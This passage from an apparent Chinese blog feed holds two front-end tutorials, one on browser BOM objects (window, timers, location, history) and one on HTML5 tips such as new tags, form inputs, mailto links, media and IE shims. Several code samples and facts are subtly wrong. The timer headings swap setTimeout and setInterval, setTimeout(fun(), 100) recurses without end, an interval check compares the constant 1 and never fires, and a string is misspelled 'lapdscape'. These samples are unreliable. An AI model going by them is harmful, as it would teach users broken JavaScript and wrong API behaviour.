DOM 的不同之处"></a>BOM 和 DOM 的不同之处</h2><ul><li><code>BOM</code> 即浏览器对象模型，主要用了访问一些和网页无关的浏览器功能。如： <code>window</code>、 <code>location</code>、 <code>navigator</code>、 <code>screen</code>、 <code>history</code> 等对象。</li><li><code>DOM</code> 即文档对象模型，针对 <code>HTML</code> （或 <code>XML</code> ）文档的 <code>API</code> （应用程序编程接口）。描绘的一个层次化的节点树，开发人员可以添加、修改和删除页面的某一部分。</li></ul><h1 id="细说-BOM-对象"><a href="#细说-BOM-对象" class="headerlink" title="细说 BOM 对象"></a>细说 BOM 对象</h1><h2 id="window-对象"><a href="#window-对象" class="headerlink" title="window 对象"></a>window 对象</h2><blockquote><p>window 对象表示浏览器的一个实例，同时也是 ECMAScript 规定的 Global 对象。（Global：所有在全局作用域中定义的属性和函数，都是 Global 对象的属性。在浏览器中 Global 对象实际上就是 window 对象实现的 ） 全局作用域( 所有全局对象都可以通过 window 来访问 )</p></blockquote><p><code>For Example:</code></p><pre><code class="javascript">var str = &quot;张三&quot;;
function fun() {
  alert(str);
}
// 全局对象都可以通过 window 的属性方式来访问
alert(window.str);
window.fun();
</code></pre><h3 id="弹出窗口"><a href="#弹出窗口" class="headerlink" title="弹出窗口"></a>弹出窗口</h3><p><code>For Example:</code></p><pre><code class="javascript">window.open(&quot;//www.baidu.com&quot;, &quot;NewWin&quot;, &quot;height=400,width=400&quot;);
</code></pre><p>第三个参数还可能有的值如：<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/window-object.png" alt="window 对象"></p><h3 id="间歇调用（setTimeout）"><a href="#间歇调用（setTimeout）" class="headerlink" title="间歇调用（setTimeout）"></a>间歇调用（setTimeout）</h3><p><code>For Example:</code></p><pre><code class="javascript">setTimeout(function () {
  alert(&quot;Hello world!&quot;);
}, 1000); // 会在 1000 毫秒后执行
</code></pre><p>如果在间歇时间之前想要取消执行，我们可以 <code>clearTimeout()</code>，<code>For Example:</code></p><pre><code class="javascript">// 设置超时调用
var timeoutId = setTimeout(function() {
  alert(&quot;Hello world!&quot;);
}, 1000);
//注意：把它取消
clearTimeout(timeoutId);
</code></pre><p>同样我们也可以通过间歇调用模拟实现超时调用，<code>For Example:</code></p><pre><code class="javascript">function fun() {
  // 这里可以实现某些逻辑
  setTimeout(fun(), 100);
}
fun();
</code></pre><h3 id="超时调用（setInterval）"><a href="#超时调用（setInterval）" class="headerlink" title="超时调用（setInterval）"></a>超时调用（setInterval）</h3><p><code>For Example:</code></p><pre><code class="javascript">setInterval (function() {
  alert(&quot;Hello world!&quot;);
}, 1000); // 每隔 1 秒 执行一遍
</code></pre><p>如果想要取消执行，我们可以 <code>clearTimeout()</code>，<code>For Example:</code></p><pre><code class="javascript">var i = 1;
var timeId = setInterval(function () {
  i++;
  // 这里可以执行某些逻辑
  if (1 &gt;= 100) {
    clearInterval(timeId);// 注意和取消间歇调用不一样（clearTimeout）
  }
}, 1000); // 每隔1秒 执行一遍
</code></pre><h2 id="location-对象"><a href="#location-对象" class="headerlink" title="location 对象"></a>location 对象</h2><blockquote><p>location 对象说来也是奇怪，它既是 window 的属性也是 document 属性，且同时指向了同一个对象。 window 和 document 的关系：浏览器中的 html 成为了 document 对象，使我们可以通过 javascript 来访问、操作html的元素。且 documnet 对象是 window 对象的一部分，可以通过 window.document 属性来访问。</p></blockquote><h3 id="location-的属性"><a href="#location-的属性" class="headerlink" title="location 的属性"></a>location 的属性</h3><table><thead><tr><th>属性名</th><th>例子</th><th>说明</th></tr></thead><tbody><tr><td>hash</td><td>“#contens”</td><td>返回 URL 中 hash（#号后跟零或多个字符），如果 URL 中不包含散列，则返回空字符串</td></tr><tr><td>host</td><td>“www.baidu.com:80”</td><td>返回服务器名和端口号</td></tr><tr><td>hostname</td><td>“www.baidu.com”</td><td>返回不带端口号的服务器名称</td></tr><tr><td>href</td><td>“<a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a>“</td><td>返回当前加载页面的完整 URL。location 对象的 toString() 方法也返回该值</td></tr><tr><td>pathname</td><td>“/admin/“</td><td>返回 URL 中的目录或文件名</td></tr><tr><td>port</td><td>“8080”</td><td>返回 URL 中指定的端口号，如果 URL 中不包含端口号，则返回空字符串</td></tr><tr><td>protocol</td><td>“http:”</td><td>返回页面使用的协议。通常是 http: 或者是 https:</td></tr><tr><td>search</td><td>“?q=javascript&amp;&amp;tags=web”</td><td>返回 URL 中查询的字符串。查询以 ？ 与前面的字符串分割，用 &amp;&amp; 连接多个类型的查询</td></tr></tbody></table><p>有了上面这些属性，我们可以非常方便的修改 <code>url</code>，<code>For Example:</code></p><pre><code class="javascript">// 假设初始 URL 为 //www.wrox.com/WileyCDA/

// 将 URL 修改为 &quot;//www.wrox.com/WileyCDA/#section1&quot;
location.hash = &quot;#section1&quot;;

// 将 URL 修改为 &quot;//www.wrox.com/WileyCDA/?q=javascript&quot;
location.search = &quot;?q=javascript&quot;;

// 将 URL 修改为 &quot;//www.yahoo.com/WileyCDA/&quot;
location.hostname = &quot;www.yahoo.com&quot;;

// 将 URL 修改为 &quot;//www.yahoo.com/mydir/&quot;
location.pathname = &quot;mydir&quot;;

// 将 URL 修改为 &quot;//www.yahoo.com:8080/WileyCDA/&quot;
location.port = 8080;
</code></pre><p>每次修改 <code>location</code> 的属性（ <code>hash</code> 除外），页面都会以新 URL 重新加载。也就是说，浏览器会生成一天后退的历史记录。如果我们不想能够回退可以使用 <code>replace（）</code> 方法，<code>For Example:</code></p><pre><code class="javascript">location.replace(&quot;//www.baidu.com&quot;); // 如此就不会有回退记录了。
</code></pre><p>除了 <code>replace</code> 方法外还有个比较重要的方法。<code>reload</code> 方法用来刷新。</p><pre><code class="javascript">location.reload(); // 重新加载（有可能从缓存中加载）
location.reload(true); // 重新加载（从服务器重新加载）也就是强制刷新
</code></pre><h2 id="navigator-对象、screen-对象"><a href="#navigator-对象、screen-对象" class="headerlink" title="navigator 对象、screen 对象"></a>navigator 对象、screen 对象</h2><blockquote><p>navigator 对象主要用来识别客户端浏览器，但是由于各类浏览器对 navigator 对象的实现各有不同，这里就不细分析了。 screen 对象基本上只用来表明客户端的能力，其中包括浏览器窗口外部的显示器的信息，如像素宽度和高度等。每种浏览器对其的支持程度也是不同的，这里也不分析了。</p></blockquote><h2 id="history-对象"><a href="#history-对象" class="headerlink" title="history 对象"></a>history 对象</h2><blockquote><p>history 对象主要保存当前也网页的历史记录。但出于安全考虑，程序员不能够知道详细的 url。</p></blockquote><p><code>For Example:</code></p><pre><code class="javascript">history.length; // 历史记录的数量
history.back(); // 后退一页
history.forward(); // 前进一页
history.go(-1); // 后退一页
history.go(1); // 前进一页
history.go(2); // 前进两页
history.go(&quot;wrox.com&quot;); // 跳转到最近的 wrox.com 页面
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Pentest </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML5 的一些冷知识]]></title>
      <url>/2016/08/html5-cold-knowledge/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>现已进入了 HTML5 时代，这些知识在前端开发人员眼里也就变得更加重要<a id="more"></a></p><h1 id="HTML5-带来的好处"><a href="#HTML5-带来的好处" class="headerlink" title="HTML5 带来的好处"></a>HTML5 带来的好处</h1><p>关于新标记和语义的价值的讨论已经很多，有些人认为这些语义以及可视化表现方式没有任何意义。因为它们带来的是更复杂的代码，创造了使用这些新 HTML 代码犯新错误的机会，HTML5 新语义的价值在于提升了网站用户和这些技术之间的交互和协作的水平，这是使互联网前进的原因。</p><p>同样的道理，我们应该明白，就像 HTML5 给我们的感觉是那样酷一样，人们在其上付出了很多的努力，对未来 5 年互联网的发展寄予厚望。 今天，这些新标记和语义看起来的确是很棒，我们都很喜欢，但别忘了，任何东西都是在不断变化着来适应人们的需求，新的语言特征必须依赖于人们的使用，互联网社区的大量使用，只有这样才能使单纯的新事物变成有用的新事物。</p><h1 id="文档类型和编码"><a href="#文档类型和编码" class="headerlink" title="文档类型和编码"></a>文档类型和编码</h1><h2 id="HTML5-文档类型很简单"><a href="#HTML5-文档类型很简单" class="headerlink" title="HTML5 文档类型很简单"></a>HTML5 文档类型很简单</h2><pre><code class="html">&lt;!doctype html&gt;
</code></pre><h2 id="HTML5-使用-UTF-8-编码"><a href="#HTML5-使用-UTF-8-编码" class="headerlink" title="HTML5 使用 UTF-8 编码"></a>HTML5 使用 UTF-8 编码</h2><pre><code class="html">&lt;meta charset=&quot;UTF-8&quot;&gt;
</code></pre><h1 id="HTML5-新增元素"><a href="#HTML5-新增元素" class="headerlink" title="HTML5 新增元素"></a>HTML5 新增元素</h1><h2 id="新标签"><a href="#新标签" class="headerlink" title="新标签"></a>新标签</h2><ul><li><strong>article</strong> =&gt; 定义一篇文章</li><li><strong>aside</strong> =&gt; 定义页面内容部分的侧边栏</li><li><strong>audio</strong> =&gt; 定义音频内容</li><li><strong>canvas</strong> =&gt; HTML5 画布</li><li><strong>command</strong> =&gt; 定义一个命令按钮</li><li><strong>datalist</strong> =&gt; 定义一个下拉列表</li><li><strong>details</strong> =&gt; 定义一个元素的详细内容</li><li><strong>dialog</strong> =&gt; 定义一个对话框(会话框)</li><li><strong>embed</strong> =&gt; 定义外部的可交互的内容或插件</li><li><strong>figure</strong> =&gt; 定义一组媒体内容以及它们的标题</li><li><strong>figcaption</strong> =&gt; figure 的标题</li><li><strong>footer</strong> =&gt; 定义一个页面或一个区域的底部</li><li><strong>header</strong> =&gt; 定义一个页面或一个区域的头部</li><li><strong>hgroup</strong> =&gt; 定义文件中一个区块的相关信息</li><li><strong>keygen</strong> =&gt; 定义表单里一个生成的键值</li><li><strong>mark</strong> =&gt; 定义有标记的文本</li><li><strong>meter</strong> =&gt; 定义度量衡，仅用于已知最大和最小值的度量</li><li><strong>nav</strong> =&gt; 定义导航链接</li><li><strong>output</strong> =&gt; 定义一些输出类型</li><li><strong>progress</strong> =&gt; 定义任务的过程</li><li><strong>rp</strong> =&gt; 在 ruby 注释中使用，以定义不支持 ruby 元素的浏览器所显示的内容，ruby 注释是中文注音或字符</li><li><strong>rt</strong> =&gt; 定义字符（中文注音或字符）的解释或发音，ruby 注释是中文注音或字符</li><li><strong>ruby</strong> =&gt; 定义 ruby 注释（中文注音或字符）</li><li><strong>section</strong> =&gt; 定义一个区域</li><li><strong>source</strong> =&gt; 定义媒体资源</li><li><strong>time</strong> =&gt; 定义一个日期或者时间</li><li><strong>video</strong> =&gt; 定义一个视频</li></ul><h3 id="一个简单的实例"><a href="#一个简单的实例" class="headerlink" title="一个简单的实例"></a>一个简单的实例</h3><pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot; /&gt;
    &lt;title&gt;Title&lt;/title&gt;
  &lt;/head&gt;
&lt;body&gt;
  &lt;header&gt;
    &lt;h1&gt;Header in h1&lt;/h1&gt;
    &lt;h2&gt;Subheader in h2&lt;/h2&gt;
  &lt;/header&gt;

  &lt;nav&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Menu Option 1&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Menu Option 2&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Menu Option 3&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/nav&gt;

  &lt;section&gt;
    &lt;article&gt;
      &lt;header&gt;
        &lt;h1&gt;Article #1&lt;/h1&gt;
      &lt;/header&gt;
      &lt;section&gt;
        This is the first article.  This is &lt;mark&gt;highlighted&lt;/mark&gt;.
      &lt;/section&gt;
    &lt;/article&gt;

    &lt;article&gt;
      &lt;header&gt;
        &lt;h1&gt;Article #2&lt;/h1&gt;
      &lt;/header&gt;
      &lt;section&gt;
        This is the second article.  These articles could be blog posts, etc.
      &lt;/section&gt;
    &lt;/article&gt;
  &lt;/section&gt;

  &lt;aside&gt;
    &lt;section&gt;
      &lt;h1&gt;Links&lt;/h1&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 1&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 2&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 3&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/section&gt;

    &lt;figure&gt;
      &lt;img width=&quot;150&quot; height=&quot;auto&quot;
        src=&quot;//www.baidu.com/img/bd_logo1.png&quot;
        alt=&quot;baidu logo&quot; /&gt;
      &lt;figcaption&gt;baidu logo&lt;/figcaption&gt;
    &lt;/figure&gt;
  &lt;/aside&gt;

  &lt;footer&gt;Footer - Copyright &lt;time&gt;2016&lt;/time&gt;&lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/html5-1.png" alt="H5元素"></p><h2 id="表单新元素、类型"><a href="#表单新元素、类型" class="headerlink" title="表单新元素、类型"></a>表单新元素、类型</h2><ul><li><strong>datalist</strong> =&gt; 数据列表</li><li><strong>datetime</strong> =&gt; 手工输入完整的时间</li><li><strong>datetime-local</strong> =&gt; 含日期（年月日）和时间</li><li><strong>output</strong> =&gt; 输出一个算法或脚本执行的结果</li><li><strong>keygen</strong> =&gt; 为数据生成一对密钥（公钥和私钥），当提交表单时，私钥存储在本地，公钥发送到服务器。</li><li><strong>date</strong> =&gt; 只含年月日的日期</li><li><strong>month</strong> =&gt; 只含年月的日期</li><li><strong>week</strong> =&gt; 只含年、周的日期</li><li><strong>time</strong> =&gt; 选择时间</li><li><strong>color</strong> =&gt; 颜色选择器</li><li><strong>number</strong> =&gt; 只能输入数字，移动端会弹出数字键盘</li><li><strong>range</strong> =&gt; 一个固定范围内的数字</li><li><strong>email</strong> =&gt; 只能输入邮箱地址，移动端会弹出英文键盘</li><li><strong>url</strong> =&gt; 只能输入 URL 网址，移动端会弹出英文键盘</li><li><strong>tel</strong> =&gt; 只能输入电话号码，移动端会弹出数字键盘</li><li><strong>search</strong> =&gt; 搜索内容框，移动端会弹出英文键盘</li></ul><h3 id="一个简单的实例-1"><a href="#一个简单的实例-1" class="headerlink" title="一个简单的实例"></a>一个简单的实例</h3><pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot; /&gt;
    &lt;title&gt;Title&lt;/title&gt;
  &lt;/head&gt;
&lt;body&gt;
  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
    &lt;div&gt;
      &lt;input id=&quot;myCar&quot; list=&quot;cars&quot; type=&quot;text&quot;&gt;
      &lt;datalist id=&quot;cars&quot;&gt;
        &lt;option value=&quot;BMW&quot;&gt;
        &lt;option value=&quot;Ford&quot;&gt;
        &lt;option value=&quot;Volvo&quot;&gt;
      &lt;/datalist&gt;
    &lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;datatime&quot; value=&quot;2016-08-15T10:50Z&quot;&gt;&lt;/div&gt;

    &lt;div&gt;
      &lt;div&gt;Username: &lt;input type=&quot;text&quot; name=&quot;usr_name&quot;&gt;&lt;/div&gt;
      &lt;div&gt;Encryption: &lt;keygen name=&quot;security&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;date&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;month&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;week&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;time&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;datetime-local&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;search&quot; value=&quot;百度一下，你就知道&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;color&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;email&quot; value=&quot;666666@qq.com&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;url&quot; value=&quot;//vxhly.github.io&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;input type=&quot;tel&quot; value=&quot;800820820&quot;&gt;&lt;/div&gt;

    &lt;div&gt;&lt;button type=&quot;submit&quot;&gt;submit&lt;/button&gt;&lt;/div&gt;

    &lt;div&gt;&lt;button type=&quot;reset&quot;&gt;reset&lt;/button&gt;&lt;/div&gt;
  &lt;/form&gt;

  &lt;form oninput=&quot;x.value=parseInt(a.value)+parseInt(b.value)&quot;&gt;
    0 &lt;input type=&quot;range&quot; id=&quot;a&quot; value=&quot;50&quot;&gt; 100 +
    &lt;input type=&quot;number&quot; id=&quot;b&quot; value=&quot;50&quot;&gt; =
    &lt;output name=&quot;x&quot; for=&quot;a b&quot;&gt;&lt;/output&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/html5-2.png" alt="H5表单"></p><h1 id="HTML5-废弃的内容"><a href="#HTML5-废弃的内容" class="headerlink" title="HTML5 废弃的内容"></a>HTML5 废弃的内容</h1><blockquote><p>HTML5 废弃了一些过时的，不合理的 HTML 标签</p></blockquote><ul><li><strong>acronym</strong></li><li><strong>center</strong></li><li><strong>dir</strong></li><li><strong>font</strong></li><li><strong>s</strong></li><li><strong>strike</strong></li><li><strong>tt</strong></li><li><strong>u</strong></li><li><strong>frame</strong></li><li><strong>frameset</strong></li><li><strong>noframe</strong></li><li><strong>applet</strong></li><li><strong>big</strong></li><li><strong>center</strong></li><li><strong>basefront</strong></li></ul><h1 id="打电话发短信写邮件"><a href="#打电话发短信写邮件" class="headerlink" title="打电话发短信写邮件"></a>打电话发短信写邮件</h1><h2 id="打电话"><a href="#打电话" class="headerlink" title="打电话"></a>打电话</h2><pre><code class="html">&lt;a href=&quot;tel:010-88888&quot;&gt;打电话给:010-88888&lt;/a&gt;
</code></pre><h2 id="发短信"><a href="#发短信" class="headerlink" title="发短信"></a>发短信</h2><pre><code class="html">&lt;a href=&quot;sms:88888&quot;&gt;发短信给: 88888&lt;/a&gt;
</code></pre><h2 id="写邮件"><a href="#写邮件" class="headerlink" title="写邮件"></a>写邮件</h2><pre><code class="html">&lt;!-- 注：在添加这些功能时，第一个功能以&quot;?&quot;开头，后面的以&quot;&amp;&quot;开头 --&gt;
&lt;!-- 1.普通邮件 --&gt;
&lt;a href=&quot;mailto:haha@wtf.com&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 2.收件地址后添加?cc=开头，可添加抄送地址（Android存在兼容问题） --&gt;
&lt;a href=&quot;mailto:haha@wtf.com?cc=666@wtf.com&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 3.跟着抄送地址后，写上&amp;bcc=,可添加密件抄送地址（Android存在兼容问题） --&gt;
&lt;a href=&quot;mailto:haha@wtf.com?cc=666@wtf.com&amp;bcc=384900096@wtf.com&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 4.包含多个收件人、抄送、密件抄送人，用分号(;)隔开多个邮件人的地址 --&gt;
&lt;a href=&quot;mailto:haha@wtf.com;384900096@wtf.com&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 5.包含主题，用?subject= --&gt;
&lt;a href=&quot;mailto:haha@wtf.com?subject=邮件主题&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 6.包含内容，用?body=;如内容包含文本，使用%0A给文本换行 --&gt;
&lt;a href=&quot;mailto:haha@wtf.com?body=邮件主题内容%0A我是第二行内容%0A你没有猜错，这是我是第三行。&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 7.内容包含链接，含http(s)://等的文本自动转化为链接 --&gt;
&lt;a href=&quot;mailto:haha@wtf.com?body=//www.wtf.com&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 8.内容包含图片（PC不支持） --&gt;
&lt;a href=&quot;mailto:haha@wtf.com?body=&lt;img src=&#39;images/torrent.jpg&#39; /&gt;&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;

&lt;!-- 9.完整示例 --&gt;
&lt;a href=&quot;mailto:haha@wtf.com;384900096@wtf.com?cc=666@wtf.com&amp;bcc=993233461@wtf.com&amp;subject=[邮件主题]&amp;body=我是第一行内容%0A%0A//www.baidu.com%0A%0A&lt;img src=&#39;images/1.jpg&#39; /&gt;&quot;&gt;快来点我啊，给你发种子。&lt;/a&gt;
</code></pre><h1 id="取消英文首字母的默认大写"><a href="#取消英文首字母的默认大写" class="headerlink" title="取消英文首字母的默认大写"></a>取消英文首字母的默认大写</h1><pre><code class="html">&lt;input autocapitalize=&quot;off&quot; autocorrect=&quot;off&quot; /&gt;
</code></pre><h1 id="屏幕旋转的事件和样式"><a href="#屏幕旋转的事件和样式" class="headerlink" title="屏幕旋转的事件和样式"></a>屏幕旋转的事件和样式</h1><pre><code class="javascript">function orientInit(){
    var orientChk = document.documentElement.clientWidth &gt; document.documentElement.clientHeight?&#39;landscape&#39;:&#39;portrait&#39;;
    if(orientChk ==&#39;lapdscape&#39;){
        //横屏下需要执行代码
    }else{
        //竖屏下需要执行代码
    }
}

orientInit();
window.addEventListener(&#39;onorientationchange&#39; in window?&#39;orientationchange&#39;:&#39;resize&#39;, function(){
    setTimeout(orientInit, 100);
},false)
</code></pre><pre><code class="css">/*竖屏时样式*/
@media all and (orientation:portrait){   }
/*横屏时样式*/
@media all and (orientation:landscape){   }
</code></pre><h1 id="HTML5-多媒体标签"><a href="#HTML5-多媒体标签" class="headerlink" title="HTML5 多媒体标签"></a>HTML5 多媒体标签</h1><h2 id="嵌入音频"><a href="#嵌入音频" class="headerlink" title="嵌入音频"></a>嵌入音频</h2><blockquote><p>HTML5 支持 MP3、Wav 和 Ogg 格式的音频，下面是在网页中嵌入音频的简单示例。</p></blockquote><pre><code class="html">&lt;audio controls&gt;
  &lt;source src=&quot;jamshed.mp3&quot; type=&quot;audio/mpeg&quot;&gt;
  Your browser does’nt support audio embedding feature.
&lt;/audio&gt;
</code></pre><h2 id="嵌入视频"><a href="#嵌入视频" class="headerlink" title="嵌入视频"></a>嵌入视频</h2><blockquote><p>HTML5 支持 MP4、WebM 和 Ogg 格式的视频，下面是在网页中嵌入视频的简单示例。</p></blockquote><pre><code class="html">&lt;video width=&quot;450&quot; height=&quot;340&quot; controls&gt;
  &lt;source src=&quot;jamshed.mp4&quot; type=&quot;video/mp4&quot;&gt;
  Your browser does’nt support video embedding feature.
&lt;/video&gt;
</code></pre><h2 id="其他标签"><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h2><blockquote><p>HTML5 对于多媒体提供了强有力的支持，除了 audio 和 video 标签外，还支持以下标签：</p></blockquote><h3 id="embed-标签"><a href="#embed-标签" class="headerlink" title="embed 标签"></a>embed 标签</h3><blockquote><p>定义嵌入的内容，比如插件。</p></blockquote><pre><code class="html">&lt;embed type=&quot;video/quicktime&quot; src=&quot;Fishing.mov&quot;&gt;
</code></pre><h3 id="source-标签"><a href="#source-标签" class="headerlink" title="source 标签"></a>source 标签</h3><blockquote><p>对于定义多个数据源很有用，解决音频/视频在不同浏览器的解析问题。</p></blockquote><pre><code class="html">&lt;video width=&quot;450&quot; height=&quot;340&quot; controls&gt;
  &lt;source src=&quot;jamshed.mp4&quot; type=&quot;video/mp4&quot;&gt;
  &lt;source src=&quot;jamshed.ogg&quot; type=&quot;video/ogg&quot;&gt;
&lt;/video&gt;
</code></pre><h2 id="track-标签"><a href="#track-标签" class="headerlink" title="track 标签"></a>track 标签</h2><blockquote><p>为诸如 video 元素之类的媒介规定外部文本轨道。 用于规定字幕文件或其他包含文本的文件，当媒介播放时，这些文件是可见的。</p></blockquote><pre><code class="html">&lt;video width=&quot;450&quot; height=&quot;340&quot; controls&gt;
  &lt;source src=&quot;jamshed.mp4&quot; type=&quot;video/mp4&quot;&gt;
  &lt;source src=&quot;jamshed.ogg&quot; type=&quot;video/ogg&quot;&gt;
  &lt;track kind=&quot;subtitles&quot; label=&quot;English&quot;
    src=&quot;jamshed_en.vtt&quot; srclang=&quot;en&quot; default&gt;&lt;/track&gt;
  &lt;track kind=&quot;subtitles&quot; label=&quot;Arabic&quot;
    src=&quot;jamshed_ar.vtt&quot; srclang=&quot;ar&quot;&gt;&lt;/track&gt;
&lt;/video&gt;
</code></pre><h2 id="播放视频不全屏"><a href="#播放视频不全屏" class="headerlink" title="播放视频不全屏"></a>播放视频不全屏</h2><pre><code class="html">&lt;!--
1.ios7+支持自动播放
2.支持Airplay的设备（如：音箱、Apple TV)播放
x-webkit-airplay=&quot;true&quot;
3.播放视频不全屏
webkit-playsinline=&quot;true&quot;
--&gt;
&lt;video x-webkit-airplay=&quot;true&quot; webkit-playsinline=&quot;true&quot; preload=&quot;auto&quot; autoplay src=&quot;//&quot;&gt;&lt;/video&gt;
</code></pre><h1 id="利用-canvas-绘制图形"><a href="#利用-canvas-绘制图形" class="headerlink" title="利用 canvas 绘制图形"></a>利用 canvas 绘制图形</h1><blockquote><p>Canvas 元素用于在网页上绘制图形，该元素标签强大之处在于可以直接在 HTML 上进行图形操作。 利用 Canvas 元素绘制图形，需要 JavaScript 脚本的支持，所以 JavaScript 编程能力不是很好的童鞋不要轻易尝试编写，还是去网上复制粘帖吧！</p></blockquote><pre><code class="html">&lt;canvas id=&quot;canvas1&quot; width=&quot;300&quot; height=&quot;100&quot;&gt;
&lt;/canvas&gt;
</code></pre><h1 id="HTML5-存储类型"><a href="#HTML5-存储类型" class="headerlink" title="HTML5 存储类型"></a>HTML5 存储类型</h1><blockquote><p>HTML5 能够本地存储数据，在之前都是使用 cookies 使用的。 该存储方案需要编写 JavaScript 脚本支持，所以 JavaScript 编程能力不是很好的童鞋不要轻易尝试编写，还是去网上复制粘帖吧！ HTML5 提供了下面两种本地存储方案：</p></blockquote><ul><li><strong>localStorage</strong> 用于持久化的本地存储，数据永远不会过期，关闭浏览器也不会丢失。</li><li><strong>sessionStorage</strong> 同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此 <code>sessionStorage</code> 不是一种持久化的本地存储，仅仅是会话级别的存储</li></ul><h1 id="HTML5-提供了新的-API"><a href="#HTML5-提供了新的-API" class="headerlink" title="HTML5 提供了新的 API"></a>HTML5 提供了新的 API</h1><blockquote><p>有助于快速开发应用程序。 HTML5 提供的应用程序 API 主要有：</p></blockquote><ul><li><strong>Media API</strong></li><li><strong>Text Track API</strong></li><li><strong>Application Cache API</strong></li><li><strong>User Interaction</strong></li><li><strong>Data Transfer API</strong></li><li><strong>Command API</strong></li><li><strong>Constraint Validation API</strong></li><li><strong>History API</strong></li></ul><h1 id="HTML5-应用程序缓存"><a href="#HTML5-应用程序缓存" class="headerlink" title="HTML5 应用程序缓存"></a>HTML5 应用程序缓存</h1><blockquote><p>应用程序缓存是 HTML5 的重要特性之一，它提供了离线使用的功能，让应用程序可以获取本地的网站内容，例如 HTML、CSS、图片以及 JavaScript。这个特性可以提高网站性能，它的实现借助于 manifest 文件，如下：</p></blockquote><pre><code class="html">&lt;!doctype html&gt;
&lt;html manifest=&quot;example.appcache&quot;&gt;
  ...
&lt;/html&gt;
</code></pre><blockquote><p>与传统浏览器缓存相比，它不强制用户访问的网站内容被缓存。</p></blockquote><h1 id="HTML5-标签完美兼容-IE"><a href="#HTML5-标签完美兼容-IE" class="headerlink" title="HTML5 标签完美兼容 IE"></a>HTML5 标签完美兼容 IE</h1><blockquote><p>为了方便兼容 IE8 中使用 HTML5，可以使用 JS 的方法来使低于 IE9 版本的 IE 浏览器兼容。</p></blockquote><pre><code class="html">&lt;!--[if lt IE 9]&gt;
  &lt;script&gt;
  (function(){
    var tags =
      [&#39;header&#39;,&#39;footer&#39;,&#39;figure&#39;,&#39;figcaption&#39;,&#39;details&#39;,&#39;summary&#39;,&#39;hgroup&#39;,&#39;nav&#39;,&#39;aside&#39;,&#39;article&#39;,&#39;section&#39;,&#39;mark&#39;,&#39;abbr&#39;,&#39;meter&#39;,&#39;output&#39;,&#39;progress&#39;,&#39;time&#39;,&#39;video&#39;,&#39;audio&#39;,&#39;canvas&#39;,&#39;dialog&#39;];
      for(var i=tags.length - 1;i&gt;-1;i--){
        document.createElement(tags[i]);
      }
  })();
  &lt;/script&gt;
&lt;![endif]--&gt;
</code></pre><blockquote><p>使用 Google 的 html5shiv.js（Google 在中国打不开，谨慎使用）<br><br><strong>html5shiv.js</strong>：解决 ie9 以下浏览器对 html5 新增标签的不识别，并导致 CSS 不起作用的问题。</p></blockquote><pre><code class="html">&lt;!--[if lt IE 9]&gt;
  &lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;
&lt;![endif]--&gt;
</code></pre><blockquote><p>Google 的 html5shiv 包不适用，这里提供 Baidu 的 html5shiv.js</p></blockquote><pre><code class="html">&lt;!--[if lt IE 9]&gt;
  &lt;script src=&quot;//libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt;
&lt;![endif]--&gt;
</code></pre><blockquote><p>这里还提供 bootstarp CDN 的 htmlshiv.js 和 respond.min.js<br><br><strong>respond.min.js</strong>：让不支持 css3 Media Query 的浏览器包括IE6-IE8等其他浏览器支持查询。</p></blockquote><pre><code class="html">&lt;!--[if lt IE 9]&gt;
